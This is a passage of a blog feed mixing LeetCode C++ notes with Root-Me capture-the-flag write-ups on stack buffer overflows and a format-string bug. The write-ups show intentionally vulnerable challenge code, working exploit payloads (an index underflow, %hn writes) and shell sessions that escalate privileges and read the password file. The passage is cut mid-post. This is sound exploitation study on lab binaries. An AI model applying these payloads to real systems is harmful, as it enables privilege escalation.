&lt;p&gt;哈希表：&lt;br&gt;哈希表存着目前最长子组的值-地址对&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow basic 3</title>
    <link href="http://finsenty54.github.io/2020/12/11/Stack_buffer_overflow_basic_3/"/>
    <id>http://finsenty54.github.io/2020/12/11/Stack_buffer_overflow_basic_3/</id>
    <published>2020-12-11T07:21:28.000Z</published>
    <updated>2020-12-11T07:23:47.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Stack-buffer-overflow-basic-3"><a href="#ELF-x86-Stack-buffer-overflow-basic-3" class="headerlink" title="ELF x86 - Stack buffer overflow basic 3"></a>ELF x86 - Stack buffer overflow basic 3</h2><a id="more"></a><p>参考:: <a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%203">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%203</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">int</span> check;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(count &gt;= <span class="number">64</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Oh no...Sorry !\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(check == <span class="number">0xbffffabc</span>)</span><br><span class="line">        shell();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            read(fileno(<span class="built_in">stdin</span>),&amp;i,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">switch</span>(i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\a&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">                  count--;</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x04</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\a&quot;</span>);</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  buffer[count] = i;</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setreuid(geteuid(), geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>0x0804866a &lt;+116&gt;:   cmp    DWORD PTR [ebp-0x50],0xbffffabc</code></p><p>如果<code>  buffer[count]</code> 指向 check的地址， 那么<code>buffer[count] = i</code>就可以把输入值赋给check<br>将count减为-4，buffer[-4]就相当于buffer地址减去4</p><pre><code>app-systeme-ch16@challenge02:~$ (python -c &#39;print &quot;\x08&quot;*4+&quot;\xbc\xfa\xff\xbf&quot;&#39;;cat )| ./ch16Enter your name: iduid=1216(app-systeme-ch16-cracked) gid=1116(app-systeme-ch16) groups=1116(app-systeme-ch16),100(users)cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Stack-buffer-overflow-basic-3&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-3&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 3&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 3&lt;/h2&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Format string bug basic 2</title>
    <link href="http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/"/>
    <id>http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/</id>
    <published>2020-11-29T12:25:46.000Z</published>
    <updated>2020-11-29T12:28:56.901Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Format-string-bug-basic-2"><a href="#ELF-x86-Format-string-bug-basic-2" class="headerlink" title="ELF x86 - Format string bug basic 2"></a>ELF x86 - Format string bug basic 2</h2><hr><h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><p><code>snprintf</code>— prints into a <code>string</code> with length checking<br>(<a href="https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html">https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html</a>)<br>snprintf（）函数应与sprintf（）等效，并增加了n参数，该参数指出s所指缓冲区的大小。<br>·如果n为零，则不写任何内容，而s可以为空指针。<br>·否则，将丢弃第n-1st之后的输出字节，而不是将其写入数组，并且在实际写入数组的字节的末尾写入一个空字节。<br><em>也就是增加了限制</em></p><a id="more"></a><hr><h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p><code>format</code>是一个字符串，以其初始移位状态（如果有）开始和结束。<br>format由零个或多个<code>指令</code>组成：<code>普通字符</code>（简单地<code>复制到输出流</code>中）和<code>转换规范</code>，每个转换规范都将导致获取零个或多个<code>参数</code>。<br>·如果format的参数不足，则结果不确定</p><hr><h3 id="％n"><a href="#％n" class="headerlink" title="％n $"></a>％n $</h3><p>·可以将<code>转换</code>应用于参数列表中格式之后的第n个参数，而不是下一个未使用的参数。<br>·在这种情况下，转换说明符字符％（请参见下文）由序列“％n $”代替，其中n是[1，{NL_ARGMAX}]范围内的十进制整数，给出了参数在参数中的位置。</p><hr><p>For example, <code>printf(&quot;%2$x&quot;, 1, 2, 3)</code> will print<code> 2</code>. In general, we can do <code>printf(&quot;%&lt;some number&gt;$x&quot;)</code> to select an arbitrary argument to printf.</p><hr><h3 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h3><p>n  参数应该是一个指向整数的指针，到目前为止，通过对fprintf（）函数之一的调用，将写入输出的<code>字节数</code></p><hr><p>The <code>number of characters written so far</code> is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</p><hr><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv )</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">int</span> var;</span><br><span class="line">        <span class="keyword">int</span> check  = <span class="number">0x04030201</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">char</span> fmt[<span class="number">128</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (argc &lt;<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>( fmt, <span class="number">0</span>, <span class="keyword">sizeof</span>(fmt) );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check at 0x%x\n&quot;</span>, &amp;check );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;argv[1] = [%s]\n&quot;</span>, argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">snprintf</span>( fmt, <span class="keyword">sizeof</span>(fmt), argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))    </span><br><span class="line">                <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way !\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;fmt=[%s]\n&quot;</span>, fmt );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check=0x%x\n&quot;</span>, check );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (check==<span class="number">0xdeadbeef</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude ! You win !\n&quot;</span>);</span><br><span class="line">                setreuid(geteuid(), geteuid());</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">Download</span><br></pre></td></tr></table></figure><hr><h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><pre><code>app-systeme-ch14@challenge02:~$ (for i in `seq 1 10`; do ./ch14 &quot;%$i&quot;&#39;$08x&#39;; echo;done)check at 0xbffffae8argv[1] = [%1$08x]fmt=[080485f1]check=0x4030201check at 0xbffffae8argv[1] = [%2$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%3$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%4$08x]fmt=[000000c2]check=0x4030201check at 0xbffffae8argv[1] = [%5$08x]fmt=[bffffc34]check=0x4030201check at 0xbffffae8argv[1] = [%6$08x]fmt=[b7fe1439]check=0x4030201check at 0xbffffae8argv[1] = [%7$08x]fmt=[f63d4e2e]check=0x4030201check at 0xbffffae8argv[1] = [%8$08x]fmt=[04030201]check=0x4030201check at 0xbffffae8argv[1] = [%9$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%10$08x]fmt=[00000000]check=0x4030201</code></pre><p>第<code>8</code>处存着<code>check</code></p><hr><pre><code>(for i in `seq 1 12`; do ./format_2 &quot;AAAA%$i&quot;&#39;$08x&#39;;echo;done)check at 0xbffffae8argv[1] = [AAAA%8$08x]fmt=[AAAA04030201]check=0x4030201check at 0xbffffae8argv[1] = [AAAA%9$08x]fmt=[AAAA41414141]check=0x4030201check at 0xbffffae8argv[1] = [ABCD%8$08x]fmt=[ABCD04030201]check=0x4030201check at 0xbffffae8argv[1] = [ABCD%9$08x]fmt=[ABCD44434241]check=0x4030201</code></pre><p>输入值在第九处(小端序)<br>check 在第八处</p><hr><h3 id="hn"><a href="#hn" class="headerlink" title="%hn"></a>%hn</h3><p>use <code>%hn</code> to write only 2 bytes at a time.</p><pre><code>%n          一次性写入 4 个字节%hn         一次性写入 2 个字节%hhn        一次性写入 1 个字节</code></pre><p>./a.out “$(python -c ‘import sys; sys.stdout.write(“CAAAAAAA<code>%2044x%10$hn</code>%38912x%11$hn”)’)”<br><a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></p><p><del>printf (“\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|”);</del></p><p><del>./format_2 $(python2 -c ‘print “\xd8\xfa\xff\xbf%9$08s”‘)</del></p><hr><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$x&quot;&#39;)&quot;check at 0xbffffae8argv[1] = [Øúÿ¿%9$x]fmt=[Øúÿ¿bffffad8]check=0x4030201app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$s&quot;&#39;)&quot;check at 0xbffffae8argv[1] = [Øúÿ¿%9$s]fmt=[Øúÿ¿Â]check=0x4030201</code></pre><hr><p>\xdead=57005<br>\xbeef=48879<br>\xdead-\xbeef=8126<br>第九处写\xbeef 48879-8<br>第十处写\xdead 8126(已经输出了48879)</p><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 $(python -c &#39;print &quot;\xc8\xfa\xff\xbf\xca\xfa\xff\xbf%48871x%9$hn&quot;+&quot;%8126x%10$hn&quot;&#39;)check at 0xbffffac8argv[1] = [Èúÿ¿Êúÿ¿%48871x%9$hn%8126x%10$hn]fmt=[Èúÿ¿Êúÿ¿                                                    ]check=0xdeadbeefYeah dude ! You win !app-systeme-ch14-cracked@challenge02:~$ cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Format-string-bug-basic-2&quot;&gt;&lt;a href=&quot;#ELF-x86-Format-string-bug-basic-2&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Format string bug basic 2&quot;&gt;&lt;/a&gt;ELF x86 - Format string bug basic 2&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&quot;snprintf&quot;&gt;&lt;a href=&quot;#snprintf&quot; class=&quot;headerlink&quot; title=&quot;snprintf&quot;&gt;&lt;/a&gt;snprintf&lt;/h3&gt;&lt;p&gt;&lt;code&gt;snprintf&lt;/code&gt;— prints into a &lt;code&gt;string&lt;/code&gt; with length checking&lt;br&gt;(&lt;a href=&quot;https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html&quot;&gt;https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html&lt;/a&gt;)&lt;br&gt;snprintf（）函数应与sprintf（）等效，并增加了n参数，该参数指出s所指缓冲区的大小。&lt;br&gt;·如果n为零，则不写任何内容，而s可以为空指针。&lt;br&gt;·否则，将丢弃第n-1st之后的输出字节，而不是将其写入数组，并且在实际写入数组的字节的末尾写入一个空字节。&lt;br&gt;&lt;em&gt;也就是增加了限制&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>leetcode add two numbers</title>
    <link href="http://finsenty54.github.io/2020/11/29/leetcode-add-two-numbers/"/>
    <id>http://finsenty54.github.io/2020/11/29/leetcode-add-two-numbers/</id>
    <published>2020-11-29T08:18:58.000Z</published>
    <updated>2020-12-11T08:51:27.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="leetcode-add-two-numbers"><a href="#leetcode-add-two-numbers" class="headerlink" title="leetcode add two numbers"></a>leetcode add two numbers</h2><p>本题关于singly-linked list 单链表<br>链表是怎么链接在一起的？？怎么存储的？？</p><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">Solution::addTwoNumbers</span><span class="params">(ListNode *l1, ListNode *l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ListNode *answer = <span class="literal">nullptr</span>;</span><br><span class="line">    ListNode **curr = &amp;answer; <span class="comment">//指向指针的指针,一种间接寻址方式</span></span><br><span class="line">                               <span class="comment">//将answer的地址赋给curr,（64位）</span></span><br><span class="line">    ListNode *addr1 = l1;</span><br><span class="line">    ListNode *addr2 = l2;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr1 != <span class="literal">nullptr</span> || addr2 != <span class="literal">nullptr</span> ||carry&gt;<span class="number">0</span>) <span class="comment">//do not use for()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr1!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr1-&gt;val;</span><br><span class="line">            addr1=addr1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (addr2!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr2-&gt;val;</span><br><span class="line">            addr2=addr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=carry;</span><br><span class="line">        carry = sum / <span class="number">10</span>;</span><br><span class="line">        (*curr) = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>); <span class="comment">//每次新建一个node,不用取名</span></span><br><span class="line">        <span class="comment">//*curr 取得是curr地址中的64位内容，**curr 就要取两次地址中的内容</span></span><br><span class="line">        <span class="comment">//这是变量，这是把新建node的地址赋给answer,填满64位</span></span><br><span class="line">        <span class="comment">//https://www.runoob.com/cplusplus/cpp-pointer-to-pointer.html</span></span><br><span class="line">        curr = &amp;((*curr)-&gt;next); <span class="comment">//把next本身的地址赋给curr</span></span><br><span class="line">        <span class="comment">//-&gt; 相当于 *，跳转 取内容</span></span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方法：每次新建一个，匿名新建</p><hr><pre><code>ListNode *curr = nullptr; //指向指针的指针,一种间接寻址方式ListNode *answer = curr;</code></pre><p>这样赋值后，answer得到是nullptr</p><pre><code>ListNode *answer = nullptr;ListNode **curr = &amp;answer; //指向指针的指针,一种间接寻址方式</code></pre><p>这样赋值后，curr得到是answer本身的地址，而不是内容</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;leetcode-add-two-numbers&quot;&gt;&lt;a href=&quot;#leetcode-add-two-numbers&quot; class=&quot;headerlink&quot; title=&quot;leetcode add two numbers&quot;&gt;&lt;/a&gt;leetcode add two numbers&lt;/h2&gt;&lt;p&gt;本题关于singly-linked list 单链表&lt;br&gt;链表是怎么链接在一起的？？怎么存储的？？&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>leetcode 1 two sum</title>
    <link href="http://finsenty54.github.io/2020/11/26/leetcode-1-two-sum/"/>
    <id>http://finsenty54.github.io/2020/11/26/leetcode-1-two-sum/</id>
    <published>2020-11-26T08:35:52.000Z</published>
    <updated>2020-12-11T08:52:00.926Z</updated>
    
    <content type="html"><![CDATA[<p>leetcode 1 two sum</p><h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><h4 id="hash-table-哈希表"><a href="#hash-table-哈希表" class="headerlink" title="hash-table 哈希表"></a>hash-table 哈希表</h4><p>散列表<br>是根据键（Key）而直接访问在内存储存位置的数据结构</p><p>若关键字为k，则其值存放在f(k)的存储位置上。由此，不需比较便可直接取得所查记录。称这个对应关系f为散列函数，按这个思想建立的表为散列表。</p><a id="more"></a><p>例如知道值为3 ， 可以直接知道地址为2<br>地址index=H（key）</p><hr><h4 id="c-模板"><a href="#c-模板" class="headerlink" title="c++模板"></a>c++模板</h4><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。</p><p>可以简单的认为，向量是一个能够存放任意类型的动态数组。</p><h4 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h4><p><a href="https://blog.csdn.net/qq_21997625/article/details/84672775">https://blog.csdn.net/qq_21997625/article/details/84672775</a></p><p><code>mymap.insert(make_pair(nums[i],i));</code><br>小技巧</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p><a href="https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp">https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;leetcode 1 two sum&lt;/p&gt;
&lt;h3 id=&quot;学到的东西&quot;&gt;&lt;a href=&quot;#学到的东西&quot; class=&quot;headerlink&quot; title=&quot;学到的东西&quot;&gt;&lt;/a&gt;学到的东西&lt;/h3&gt;&lt;h4 id=&quot;hash-table-哈希表&quot;&gt;&lt;a href=&quot;#hash-table-哈希表&quot; class=&quot;headerlink&quot; title=&quot;hash-table 哈希表&quot;&gt;&lt;/a&gt;hash-table 哈希表&lt;/h4&gt;&lt;p&gt;散列表&lt;br&gt;是根据键（Key）而直接访问在内存储存位置的数据结构&lt;/p&gt;
&lt;p&gt;若关键字为k，则其值存放在f(k)的存储位置上。由此，不需比较便可直接取得所查记录。称这个对应关系f为散列函数，按这个思想建立的表为散列表。&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow - basic</title>
    <link href="http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/"/>
    <id>http://finsenty54.github.io/2020/11/24/Stack-buffer-overflow-basic/</id>
    <published>2020-11-24T13:29:57.000Z</published>
    <updated>2020-11-24T13:31:11.316Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x64-Stack-buffer-overflow-basic"><a href="#ELF-x64-Stack-buffer-overflow-basic" class="headerlink" title="ELF x64 - Stack buffer overflow - basic"></a>ELF x64 - Stack buffer overflow - basic</h2><p><em>gdb 内 查看函数</em></p><p><code>info functions</code></p><pre><code>0x0000000000401152  callMeMaybe0x0000000000401193  main</code></pre><a id="more"></a><hr><p>ret 后<br>会将rsp指向的内容压入RIP，转移程序执行流</p><hr><p>题目源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callMeMaybe</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-p&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> len, i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buffer);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="主要思路："><a href="#主要思路：" class="headerlink" title="主要思路："></a>主要思路：</h3><p><a 